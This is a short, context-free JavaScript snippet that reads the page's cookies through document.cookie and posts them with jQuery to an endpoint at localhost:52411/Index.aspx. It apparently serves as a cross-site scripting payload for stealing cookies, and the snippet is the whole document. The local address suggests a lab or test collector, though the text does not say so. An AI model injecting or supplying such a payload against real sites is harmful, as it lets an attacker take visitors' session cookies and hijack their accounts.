var cookie = document.cookie;

$.post('http://localhost:52411/Index.aspx',
    { cookie: cookie }, function () {

});